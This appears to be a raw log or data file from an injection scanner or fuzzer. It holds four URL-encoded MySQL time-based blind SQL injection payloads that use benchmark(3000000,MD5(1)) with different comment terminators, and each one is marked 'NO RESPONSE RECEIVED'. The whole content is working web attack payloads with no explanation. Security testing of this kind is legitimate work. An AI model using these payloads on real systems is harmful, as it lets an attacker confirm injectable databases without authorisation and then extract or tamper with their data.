"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*",NO RESPONSE RECEIVED
"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--",NO RESPONSE RECEIVED
"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23",NO RESPONSE RECEIVED
"'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*",NO RESPONSE RECEIVED
